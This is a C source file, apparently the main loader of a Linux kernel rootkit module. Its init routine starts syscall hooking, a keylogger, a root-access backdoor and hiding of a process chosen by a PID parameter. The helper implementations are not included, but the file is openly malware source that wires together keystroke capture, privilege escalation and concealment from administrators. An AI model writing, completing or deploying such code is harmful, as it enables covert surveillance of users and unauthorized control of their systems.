#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include "simple_rootkit.h"
#include "fops.h"
#include "keylogger.h"
#include "etc.h"
#include "hooking.h"
#include "root_access.h"
#include "hide_proc.h"

// module documentation
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

// module paramters
char *pid;
module_param(pid, charp, S_IRUGO);
MODULE_PARM_DESC(pid, "The pid of the process we wish to hide, as a string.");

static int __init rootkit_init(void) {
	init_hooking();
	init_fops();
	init_keylogger();
	init_root_access();
	init_hide_proc(pid);

	hook();
	printk(KERN_INFO "[+] Module loaded, inside %s.\n", __FUNCTION__);
	return 0;
}

static void __exit rootkit_exit(void) {
	exit_hooking();
	exit_fops();
	exit_keylogger();
	printk(KERN_INFO "[-] Module unloaded, inside %s.\n", __FUNCTION__);
	return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
